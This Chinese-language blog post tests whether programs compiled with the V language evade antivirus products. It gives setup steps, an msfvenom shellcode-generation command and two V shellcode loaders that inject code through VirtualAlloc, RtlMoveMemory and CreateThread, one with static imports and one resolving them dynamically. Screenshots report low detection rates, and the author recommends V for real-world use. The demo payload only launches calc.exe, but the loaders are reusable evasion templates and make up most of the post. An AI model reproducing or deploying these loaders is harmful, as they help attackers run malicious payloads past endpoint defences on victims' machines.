## 前言

VLang是2019发布的一款开源静态类型语言，最近在github趋势榜上一直占有一席之地，VLang语法跟go语言非常相似，熟悉go语言就相当于掌握了80%的v语言，有兴趣可以去[官网](https://vlang.io/)仔细查看。

就像GoLang，Nim等语言刚出来时一样，杀软对新的语言查杀力度并不大，此文章将进行一定探索。

注：笔者测试时VLang最新版本为0.2.4，此篇文章主要进行相关代码编写以及定性分析，不对vlang编译原理以及程序实现原理进行深入探索。

## Windows32位系统下VLang 安装

由于笔者在64位系统下使用VLang编译32位程序老是出问题，故使用32位win10_1808纯净虚拟机进行安装编译。

安装步骤：

>   1. 安装git
>   2. 安装[llvm-mingw](https://github.com/mstorsjo/llvm-mingw/releases)(加入环境变量)
>   3. git clone https://github.com/vlang/v
>   4. git clone https://github.com/vlang/tccbin -b thirdparty-windows-i386
>   5. move tccbin/* v/thirdparty/tcc/
>   6. cd v
>   7. git clone --depth=1 <https://github.com/vlang/vc>
>   8. .\make.bat -tcc32
>   9. 将v文件夹加入环境变量
>

>
> 注：第8步可以考虑利用make.bat使用其他编译器解析编译比如clang, gcc等，可能会对后续实验结果有影响。

![](https://image.3001.net/images/20220512/1652331463_627c93c7640ac0a37980a.png!small)

后面编译测试都在此环境下进行

## 程序执行免杀测试

### hello word杀软测试

    
    
    module main
    fn main() {
    	println('hello word')
    }

使用 v file.v 进行编译，杀软查杀情况

![](https://image.3001.net/images/20220512/1652331603_627c9453298635bcbcf52.png!small)由于默认编译选项会有很多V语言自带函数，查杀较多![](https://image.3001.net/images/20220512/1652331669_627c9495d3dbd14989667.png!small)

使用 v -prod file.v 去掉一些调试用的函数

![](https://image.3001.net/images/20220512/1652331711_627c94bf7f19c0ea99c1e.png!small)

### 动态加载函数免杀测试

    
    
    module main
    import dl
    type Exec = fn (string, int) int
    fn main() {
    	h := dl.open('kernel32', dl.rtld_now)
    	mut proc := &Exec(0)
    	proc = dl.sym(h, 'WinExec')
    	res := proc("calc.exe",2)
    	println(res)
    }

![](https://image.3001.net/images/20220512/1652331773_627c94fdae7b18aba9744.png!small)无变化

## shellcode免杀测试

> msfvenom -a x86 --platform windows -p windows/exec CMD=calc.exe -f c >>
> 1.txt
>
> ed -e 's/\x/,0x/g' -e 's/"\\\,//g' -e 's/\\\//g' -e 's/"/,/g' 1.txt

生成shellcode

### 静态导入高危函数

    
    
    module main
    import time
    #flag -luser3 //加个2  敏感词？？？
    #flag -lkernel32
    fn C.VirtualAlloc(voidptr, usize, u32, u32) voidptr
    fn C.RtlMoveMemory(voidptr, voidptr, usize)
    fn C.CreateThread(voidptr, usize, voidptr, voidptr, u32, &u32) voidptr
    fn inject(shellcode []byte) bool {
        address_pointer := C.VirtualAlloc(voidptr(0), usize(sizeof(shellcode)), 0x3000, 0x40)
        println(address_pointer)
        C.RtlMoveMemory(address_pointer, shellcode.data, shellcode.len)
    	 C.CreateThread(voidptr(0), usize(0), voidptr(address_pointer), voidptr(0), 0, &u32(0))
    	time.sleep(1000* time.millisecond)
        return true
    }
    fn main() {
        shellcode :=  [
            byte(0xda)...]
        inject(shellcode)
    }

![](https://image.3001.net/images/20220512/1652331874_627c95621d5db1ece2493.png!small)

### 动态导入高危函数

    
    
    module main
    import time
    import dl
    
    type VirtualAlloc=fn (voidptr, usize, u32, u32) voidptr
    type RtlMoveMemory=fn (voidptr, voidptr, usize) voidptr
    type CreateThread= fn (voidptr, usize, voidptr, voidptr, u32, &u32) voidptr
    fn inject(shellcode []byte) bool {
    	h := dl.open('kernel32', dl.rtld_lazy)
    	mut cvir := &VirtualAlloc(0)
    	cvir = dl.sym(h, 'VirtualAlloc')
        address_pointer :=cvir(voidptr(0), usize(sizeof(shellcode)), 0x3000, 0x40)
    	println(address_pointer)
    	h2 := dl.open('kernel32', dl.rtld_lazy)//-prod的奇怪现象
    	mut crtl := &RtlMoveMemory(0)
    	crtl = dl.sym(h2, 'RtlMoveMemory')
       crtl(address_pointer, voidptr(shellcode.data), usize(shellcode.len))
       h3 := dl.open('kernel32', dl.rtld_lazy)
     mut ccth := &CreateThread(0)
     	ccth = dl.sym(h3, 'CreateThread')
     	ccth(voidptr(0), usize(0), voidptr(address_pointer), voidptr(0), u32(0), &u32(0))
    	time.sleep(1000* time.millisecond)
        return true
    }
    
    fn main() {
        shellcode :=  [
            byte(0xda)...]
        inject(shellcode)
    }

动态导入多个函数有个比较奇怪的现象：如果都用h的sym那么使用v run file.v或者v file.v可以正常执行shellcode，但是如果使用-prod编译文件，将出现下面错误，所以使用了多次dl.open。

![](https://image.3001.net/images/20220512/1652332092_627c963ce8042ab1f2ba8.png!small)最后杀软查杀情况与hello
word比就只增加了一个。

![](https://image.3001.net/images/20220512/1652332122_627c965ad47a6178da19e.png!small)火绒：

![](https://image.3001.net/images/20220512/1652332638_627c985ebce48ee04e337.png!small)

360：

![1652332795_627c98fb69dad47bbdcab.png!small?1652332797064](https://image.3001.net/images/20220512/1652332795_627c98fb69dad47bbdcab.png!small?1652332797064)

## 总结

从上面情况看VLang的免杀效果还是不错的，和go相比，v在编程上语法更简单，更符合笔者的编程习惯，编译程序也比较小，和C编译出来的差不多，也支持跨平台，甚至在之后的0.3版本中，v将支持c代码直接转v代码。但是由于v的一些编译实现机制，正常程序造成误杀的可能性比较大。正常实战中，可以考虑使用v搞些事情。

## 参考

> https://alexfrancow.github.io/app-development/OffensiVe-Security-with-V-> Shellcode-Execution/
>
>  
>
>
> https://github.com/vlang/v

你就是大名鼎鼎的V吧??(学不动了 学不动了)

